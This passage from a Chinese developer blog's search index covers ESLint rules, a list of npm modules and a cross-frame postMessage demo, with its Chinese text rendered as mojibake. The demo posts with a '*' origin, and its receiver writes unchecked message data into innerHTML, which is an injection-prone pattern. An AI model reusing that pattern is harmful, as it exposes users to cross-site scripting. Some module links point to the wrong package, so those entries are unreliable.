2,//æœªå®šä¹‰å‰ä¸èƒ½ä½¿ç”¨</span><br><span class="line">&quot;no-useless-call&quot;: 2,//ç¦æ­¢ä¸å¿…è¦çš„callå’Œapply</span><br><span class="line">&quot;no-void&quot;: 2,//ç¦ç”¨voidæ“ä½œç¬¦</span><br><span class="line">&quot;no-var&quot;: 0,//ç¦ç”¨varï¼Œç”¨letå’Œconstä»£æ›¿</span><br><span class="line">&quot;no-warning-comments&quot;: [1, &#123; &quot;terms&quot;: [&quot;todo&quot;, &quot;fixme&quot;, &quot;xxx&quot;], &quot;location&quot;: &quot;start&quot; &#125;],//ä¸èƒ½æœ‰è­¦å‘Šå¤‡æ³¨</span><br><span class="line">&quot;no-with&quot;: 2,//ç¦ç”¨with</span><br><span class="line">&quot;array-bracket-spacing&quot;: [2, &quot;never&quot;],//æ˜¯å¦å…è®¸éç©ºæ•°ç»„é‡Œé¢æœ‰å¤šä½™çš„ç©ºæ ¼</span><br><span class="line">&quot;arrow-parens&quot;: 0,//ç®­å¤´å‡½æ•°ç”¨å°æ‹¬å·æ‹¬èµ·æ¥</span><br><span class="line">&quot;arrow-spacing&quot;: 0,//=&gt;çš„å‰/åæ‹¬å·</span><br><span class="line">&quot;accessor-pairs&quot;: 0,//åœ¨å¯¹è±¡ä¸­ä½¿ç”¨getter/setter</span><br><span class="line">&quot;block-scoped-var&quot;: 0,//å—è¯­å¥ä¸­ä½¿ç”¨var</span><br><span class="line">&quot;brace-style&quot;: [1, &quot;1tbs&quot;],//å¤§æ‹¬å·é£æ ¼</span><br><span class="line">&quot;callback-return&quot;: 1,//é¿å…å¤šæ¬¡è°ƒç”¨å›è°ƒä»€ä¹ˆçš„</span><br><span class="line">&quot;camelcase&quot;: 2,//å¼ºåˆ¶é©¼å³°æ³•å‘½å</span><br><span class="line">&quot;comma-dangle&quot;: [2, &quot;never&quot;],//å¯¹è±¡å­—é¢é‡é¡¹å°¾ä¸èƒ½æœ‰é€—å·</span><br><span class="line">&quot;comma-spacing&quot;: 0,//é€—å·å‰åçš„ç©ºæ ¼</span><br><span class="line">&quot;comma-style&quot;: [2, &quot;last&quot;],//é€—å·é£æ ¼ï¼Œæ¢è¡Œæ—¶åœ¨è¡Œé¦–è¿˜æ˜¯è¡Œå°¾</span><br><span class="line">&quot;complexity&quot;: [0, 11],//å¾ªç¯å¤æ‚åº¦</span><br><span class="line">&quot;computed-property-spacing&quot;: [0, &quot;never&quot;],//æ˜¯å¦å…è®¸è®¡ç®—åçš„é”®åä»€ä¹ˆçš„</span><br><span class="line">&quot;consistent-return&quot;: 0,//return åé¢æ˜¯å¦å…è®¸çœç•¥</span><br><span class="line">&quot;consistent-this&quot;: [2, &quot;that&quot;],//thisåˆ«å</span><br><span class="line">&quot;constructor-super&quot;: 0,//éæ´¾ç”Ÿç±»ä¸èƒ½è°ƒç”¨superï¼Œæ´¾ç”Ÿç±»å¿…é¡»è°ƒç”¨super</span><br><span class="line">&quot;curly&quot;: [2, &quot;all&quot;],//å¿…é¡»ä½¿ç”¨ if()&#123;&#125; ä¸­çš„&#123;&#125;</span><br><span class="line">&quot;default-case&quot;: 2,//switchè¯­å¥æœ€åå¿…é¡»æœ‰default</span><br><span class="line">&quot;dot-location&quot;: 0,//å¯¹è±¡è®¿é—®ç¬¦çš„ä½ç½®ï¼Œæ¢è¡Œçš„æ—¶å€™åœ¨è¡Œé¦–è¿˜æ˜¯è¡Œå°¾</span><br><span class="line">&quot;dot-notation&quot;: [0, &#123; &quot;allowKeywords&quot;: true &#125;],//é¿å…ä¸å¿…è¦çš„æ–¹æ‹¬å·</span><br><span class="line">&quot;eol-last&quot;: 0,//æ–‡ä»¶ä»¥å•ä¸€çš„æ¢è¡Œç¬¦ç»“æŸ</span><br><span class="line">&quot;eqeqeq&quot;: 2,//å¿…é¡»ä½¿ç”¨å…¨ç­‰</span><br><span class="line">&quot;func-names&quot;: 0,//å‡½æ•°è¡¨è¾¾å¼å¿…é¡»æœ‰åå­—</span><br><span class="line">&quot;func-style&quot;: [0, &quot;declaration&quot;],//å‡½æ•°é£æ ¼ï¼Œè§„å®šåªèƒ½ä½¿ç”¨å‡½æ•°å£°æ˜/å‡½æ•°è¡¨è¾¾å¼</span><br><span class="line">&quot;generator-star-spacing&quot;: 0,//ç”Ÿæˆå™¨å‡½æ•°*çš„å‰åç©ºæ ¼</span><br><span class="line">&quot;guard-for-in&quot;: 0,//for inå¾ªç¯è¦ç”¨ifè¯­å¥è¿‡æ»¤</span><br><span class="line">&quot;handle-callback-err&quot;: 0,//nodejs å¤„ç†é”™è¯¯</span><br><span class="line">&quot;id-length&quot;: 0,//å˜é‡åé•¿åº¦</span><br><span class="line">&quot;indent&quot;: [2, 4],//ç¼©è¿›é£æ ¼</span><br><span class="line">&quot;init-declarations&quot;: 0,//å£°æ˜æ—¶å¿…é¡»èµ‹åˆå€¼</span><br><span class="line">&quot;key-spacing&quot;: [0, &#123; &quot;beforeColon&quot;: false, &quot;afterColon&quot;: true &#125;],//å¯¹è±¡å­—é¢é‡ä¸­å†’å·çš„å‰åç©ºæ ¼</span><br><span class="line">&quot;lines-around-comment&quot;: 0,//è¡Œå‰/è¡Œåå¤‡æ³¨</span><br><span class="line">&quot;max-depth&quot;: [0, 4],//åµŒå¥—å—æ·±åº¦</span><br><span class="line">&quot;max-len&quot;: [0, 80, 4],//å­—ç¬¦ä¸²æœ€å¤§é•¿åº¦</span><br><span class="line">&quot;max-nested-callbacks&quot;: [0, 2],//å›è°ƒåµŒå¥—æ·±åº¦</span><br><span class="line">&quot;max-params&quot;: [0, 3],//å‡½æ•°æœ€å¤šåªèƒ½æœ‰3ä¸ªå‚æ•°</span><br><span class="line">&quot;max-statements&quot;: [0, 10],//å‡½æ•°å†…æœ€å¤šæœ‰å‡ ä¸ªå£°æ˜</span><br><span class="line">&quot;new-cap&quot;: 2,//å‡½æ•°åé¦–è¡Œå¤§å†™å¿…é¡»ä½¿ç”¨newæ–¹å¼è°ƒç”¨ï¼Œé¦–è¡Œå°å†™å¿…é¡»ç”¨ä¸å¸¦newæ–¹å¼è°ƒç”¨</span><br><span class="line">&quot;new-parens&quot;: 2,//newæ—¶å¿…é¡»åŠ å°æ‹¬å·</span><br><span class="line">&quot;newline-after-var&quot;: 2,//å˜é‡å£°æ˜åæ˜¯å¦éœ€è¦ç©ºä¸€è¡Œ</span><br><span class="line">&quot;object-curly-spacing&quot;: [0, &quot;never&quot;],//å¤§æ‹¬å·å†…æ˜¯å¦å…è®¸ä¸å¿…è¦çš„ç©ºæ ¼</span><br><span class="line">&quot;object-shorthand&quot;: 0,//å¼ºåˆ¶å¯¹è±¡å­—é¢é‡ç¼©å†™è¯­æ³•</span><br><span class="line">&quot;one-var&quot;: 1,//è¿ç»­å£°æ˜</span><br><span class="line">&quot;operator-assignment&quot;: [0, &quot;always&quot;],//èµ‹å€¼è¿ç®—ç¬¦ += -=ä»€ä¹ˆçš„</span><br><span class="line">&quot;operator-linebreak&quot;: [2, &quot;after&quot;],//æ¢è¡Œæ—¶è¿ç®—ç¬¦åœ¨è¡Œå°¾è¿˜æ˜¯è¡Œé¦–</span><br><span class="line">&quot;padded-blocks&quot;: 0,//å—è¯­å¥å†…è¡Œé¦–è¡Œå°¾æ˜¯å¦è¦ç©ºè¡Œ</span><br><span class="line">&quot;prefer-const&quot;: 0,//é¦–é€‰const</span><br><span class="line">&quot;prefer-spread&quot;: 0,//é¦–é€‰å±•å¼€è¿ç®—</span><br><span class="line">&quot;prefer-reflect&quot;: 0,//é¦–é€‰Reflectçš„æ–¹æ³•</span><br><span class="line">&quot;quotes&quot;: [1, &quot;single&quot;],//å¼•å·ç±»å‹ `` &quot;&quot; &#x27;&#x27;</span><br><span class="line">&quot;quote-props&quot;:[2, &quot;always&quot;],//å¯¹è±¡å­—é¢é‡ä¸­çš„å±æ€§åæ˜¯å¦å¼ºåˆ¶åŒå¼•å·</span><br><span class="line">&quot;radix&quot;: 2,//parseIntå¿…é¡»æŒ‡å®šç¬¬äºŒä¸ªå‚æ•°</span><br><span class="line">&quot;id-match&quot;: 0,//å‘½åæ£€æµ‹</span><br><span class="line">&quot;require-yield&quot;: 0,//ç”Ÿæˆå™¨å‡½æ•°å¿…é¡»æœ‰yield</span><br><span class="line">&quot;semi&quot;: [2, &quot;always&quot;],//è¯­å¥å¼ºåˆ¶åˆ†å·ç»“å°¾</span><br><span class="line">&quot;semi-spacing&quot;: [0, &#123;&quot;before&quot;: false, &quot;after&quot;: true&#125;],//åˆ†å·å‰åç©ºæ ¼</span><br><span class="line">&quot;sort-vars&quot;: 0,//å˜é‡å£°æ˜æ—¶æ’åº</span><br><span class="line">&quot;space-after-keywords&quot;: [0, &quot;always&quot;],//å…³é”®å­—åé¢æ˜¯å¦è¦ç©ºä¸€æ ¼</span><br><span class="line">&quot;space-before-blocks&quot;: [0, &quot;always&quot;],//ä¸ä»¥æ–°è¡Œå¼€å§‹çš„å—&#123;å‰é¢è¦ä¸è¦æœ‰ç©ºæ ¼</span><br><span class="line">&quot;space-before-function-paren&quot;: [0, &quot;always&quot;],//å‡½æ•°å®šä¹‰æ—¶æ‹¬å·å‰é¢è¦ä¸è¦æœ‰ç©ºæ ¼</span><br><span class="line">&quot;space-in-parens&quot;: [0, &quot;never&quot;],//å°æ‹¬å·é‡Œé¢è¦ä¸è¦æœ‰ç©ºæ ¼</span><br><span class="line">&quot;space-infix-ops&quot;: 0,//ä¸­ç¼€æ“ä½œç¬¦å‘¨å›´è¦ä¸è¦æœ‰ç©ºæ ¼</span><br><span class="line">&quot;space-return-throw-case&quot;: 2,//return throw caseåé¢è¦ä¸è¦åŠ ç©ºæ ¼</span><br><span class="line">&quot;space-unary-ops&quot;: [0, &#123; &quot;words&quot;: true, &quot;nonwords&quot;: false &#125;],//ä¸€å…ƒè¿ç®—ç¬¦çš„å‰/åè¦ä¸è¦åŠ ç©ºæ ¼</span><br><span class="line">&quot;spaced-comment&quot;: 0,//æ³¨é‡Šé£æ ¼è¦ä¸è¦æœ‰ç©ºæ ¼ä»€ä¹ˆçš„</span><br><span class="line">&quot;strict&quot;: 2,//ä½¿ç”¨ä¸¥æ ¼æ¨¡å¼</span><br><span class="line">&quot;use-isnan&quot;: 2,//ç¦æ­¢æ¯”è¾ƒæ—¶ä½¿ç”¨NaNï¼Œåªèƒ½ç”¨isNaN()</span><br><span class="line">&quot;valid-jsdoc&quot;: 0,//jsdocè§„åˆ™</span><br><span class="line">&quot;valid-typeof&quot;: 2,//å¿…é¡»ä½¿ç”¨åˆæ³•çš„typeofçš„å€¼</span><br><span class="line">&quot;vars-on-top&quot;: 2,//varå¿…é¡»æ”¾åœ¨ä½œç”¨åŸŸé¡¶éƒ¨</span><br><span class="line">&quot;wrap-iife&quot;: [2, &quot;inside&quot;],//ç«‹å³æ‰§è¡Œå‡½æ•°è¡¨è¾¾å¼çš„å°æ‹¬å·é£æ ¼</span><br><span class="line">&quot;wrap-regex&quot;: 0,//æ­£åˆ™è¡¨è¾¾å¼å­—é¢é‡ç”¨å°æ‹¬å·åŒ…èµ·æ¥</span><br><span class="line">&quot;yoda&quot;: [2, &quot;never&quot;]//ç¦æ­¢å°¤è¾¾æ¡ä»¶</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://eslint.cn/docs/user-guide/configuring">Configuring ESLint</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> eslint </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>node_modules</title>
      <link href="/post/node_modules.html"/>
      <url>/post/node_modules.html</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>æ¨¡å—</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><a href="https://www.npmjs.com/package/ms">ms</a></td><td>è½¬æ¢æˆæ¯«ç§’</td></tr><tr><td><a href="https://www.npmjs.com/package/async">async</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/lodash">lodash</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/body-parser">body-parser</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/co">co</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/copy-to">copy-to</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/content-type">content-type </a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/crc">crc</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/dot-object">dot-object</a></td><td>è½¬æ¢æˆå¯¹è±¡</td></tr><tr><td><a href="https://www.npmjs.com/package/express-urlrewrite">express-urlrewrite</a></td><td>é‡å†™URL</td></tr><tr><td><a href="https://www.npmjs.com/package/express-validator">express-validator</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/formidable">formidable</a></td><td>æ–‡ä»¶ä¸Šä¼ </td></tr><tr><td><a href="https://www.npmjs.com/package/generic-pool">generic-pool</a></td><td>è¿æ¥æ± </td></tr><tr><td><a href="https://www.npmjs.com/package/getmac">getmac</a></td><td>è·å–Macåœ°å€</td></tr><tr><td><a href="https://www.npmjs.com/package/image-size">image-size</a></td><td>è·å–å›¾ç‰‡å¤§å°</td></tr><tr><td><a href="https://www.npmjs.com/package/is-type-of">is-type-of</a></td><td>åˆ¤æ–­ç±»å‹</td></tr><tr><td><a href="https://www.npmjs.com/package/lru-cache">lru-cache</a></td><td>ç¼“å­˜</td></tr><tr><td><a href="https://www.npmjs.com/package/method-override">method-override</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/mime">mime</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/mkdirp">mkdirp</a></td><td>åˆ›å»ºæ–‡ä»¶å¤¹ mkdir -p</td></tr><tr><td><a href="https://www.npmjs.com/package/node-uuid">node-uuid</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/objectid">objectid</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/on-finished">on-finished</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/on-header">on-header</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/parseurl">parseurl</a></td><td>å¸¦ç¼“å­˜çš„url.parse</td></tr><tr><td><a href="https://www.npmjs.com/package/q">q</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/rc">rc </a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/redis">redis</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/request">request</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/request-id">request-id</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/response-time">response-time</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/rimraf">rimraf</a></td><td>rm -rf</td></tr><tr><td><a href="https://www.npmjs.com/package/del">del </a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/shelljs">shelljs</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/sqlstring">sqlstring</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/validator">validator</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/serve-static">serve-static</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/dateformat">dateformat</a></td><td>æ—¥æœŸæ ¼å¼åŒ–</td></tr><tr><td><a href="https://www.npmjs.com/package/cros">cros</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/debug">debug</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/log4js">log4js</a></td><td>æ—¥å¿—</td></tr><tr><td><a href="https://www.npmjs.com/package/nodemailer">nodemailer</a></td><td>å‘é‚®ä»¶</td></tr><tr><td><a href="https://www.npmjs.com/package/co-fs">co-fs</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/thunks">thunks</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/moment">moment</a></td><td>æ—¥æœŸå‹å¥½åŒ–</td></tr><tr><td><a href="https://www.npmjs.com/package/chalk">chalk</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/iconv-lite">iconv-lite</a></td><td>å­—ç¬¦ç¼–ç è½¬æ¢</td></tr><tr><td><a href="https://www.npmjs.com/package/ini">ini</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/qrcode-termina">qrcode-termina</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/randomstring">randomstring</a></td><td>ç”Ÿæˆéšæœºå­—ç¬¦ä¸²</td></tr><tr><td><a href="https://www.npmjs.com/package/xml2json">xml2json</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/protobufjs">protobufjs</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/protobufjs">http-server</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/nodemon">nodemon</a></td><td>nodeæµ‹è¯•ç¯å¢ƒ</td></tr><tr><td><a href="https://www.npmjs.com/package/etag">etag</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/markd">markd</a></td><td>markdown</td></tr><tr><td><a href="https://www.npmjs.com/package/xss-filters">xss-filters</a></td><td>xss</td></tr><tr><td><a href="https://www.npmjs.com/package/require-dir">require-dir</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/require-dir">log</a></td><td>è½»é‡çº§æ—¥å¿—</td></tr><tr><td><a href="https://www.npmjs.com/package/once">once</a></td><td>once callback</td></tr><tr><td><a href="https://www.npmjs.com/package/config">config</a></td><td>config</td></tr><tr><td><a href="https://www.npmjs.com/package/xhr">xhr</a></td><td></td></tr><tr><td><a href="https://www.npmjs.com/package/localtunnel">localtunnel</a></td><td>localtunnel</td></tr><tr><td><a href="https://www.npmjs.com/package/fs-extra">fs-extra</a></td><td>fs-extra</td></tr><tr><td><a href="https://www.npmjs.com/package/fs-extra">yargs</a></td><td>å‘½ä»¤è¡Œå‚æ•°è§£æ</td></tr><tr><td><a href="https://www.npmjs.com/package/husky">husky</a></td><td>node githook</td></tr><tr><td><a href="https://www.npmjs.com/package/filesize">filesize</a></td><td>human readable file size</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>webé€šä¿¡</title>
      <link href="/post/web-messaging.html"/>
      <url>/post/web-messaging.html</url>
      
        <content type="html"><![CDATA[<h3 id="webé€šä¿¡ä¹‹è·¨æ–‡æ¡£é€šä¿¡å®ä¾‹é¡µé¢"><a href="#webé€šä¿¡ä¹‹è·¨æ–‡æ¡£é€šä¿¡å®ä¾‹é¡µé¢" class="headerlink" title="webé€šä¿¡ä¹‹è·¨æ–‡æ¡£é€šä¿¡å®ä¾‹é¡µé¢"></a>webé€šä¿¡ä¹‹è·¨æ–‡æ¡£é€šä¿¡å®ä¾‹é¡µé¢</h3><h4 id="index-html"><a href="#index-html" class="headerlink" title="index.html"></a>index.html</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>parent<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;left.html&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;right.html&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="left-html"><a href="#left-html" class="headerlink" title="left.html"></a>left.html</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>left<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>ç¡®è®¤<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> eleForm = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;form&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        eleForm.<span class="property">onsubmit</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> message = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;input[type=&#x27;text&#x27;]&quot;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// è¿™é‡Œæ˜¯å…³é”®ï¼Œå‘é€ä¿¡æ¯</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="property">parent</span>.<span class="property">frames</span>[<span class="number">1</span>].<span class="title function_">postMessage</span>(message, <span class="string">&quot;*&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> <span class="literal">false</span>;    </span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="right-html"><a href="#right-html" class="headerlink" title="right.html"></a>right.html</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>right<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;message&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> eleBox = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#message&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> messageHandle = <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            eleBox.<span class="property">innerHTML</span> = <span class="string">&quot;æ¥å—åˆ°çš„ä¿¡æ¯æ˜¯ï¼š&quot;</span> + e.<span class="property">data</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">addEventListener</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// æ¥å—ä¿¡æ¯</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;message&quot;</span>, messageHandle, <span class="literal">false</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">attachEvent</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">// æ¥å—ä¿¡æ¯ï¼Œå…¼é¡¾IE8ä¹‹æµ</span></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">window</span>.<span class="title function_">attachEvent</span>(<span class="string">&quot;onmessage&quot;</span>, messageHandle);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://www.zhangxinxu.com/wordpress/2012/02/html5-web-messaging-cross-document-messaging-channel-messaging/">ã€1ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>window.open</title>
      <link href="/post/window.open.html"/>
      <url>/post/window.open.html</url>
      
        <content type="html"><![CDATA[<p><a href="http://520ued.com/article/5417ef368d31c11e3b0003ff">http://520ued.com/article/5417ef368d31c11e3b0003ff</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>åŒæ­¥/å¼‚æ­¥&amp;é˜»å¡/éé˜»å¡</title>
      <link href="/post/synchronous-asynchronous-blocking-nonblocking.html"/>
      <url>/post/synchronous-asynchronous-blocking-nonblocking.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/synchronous-asynchronous-blocking-nonblocking.jpg"></p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://www.zhihu.com/question/19732473">ã€1ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>rsync</title>
      <link href="/post/rsync.html"/>
      <url>/post/rsync.html</url>
      
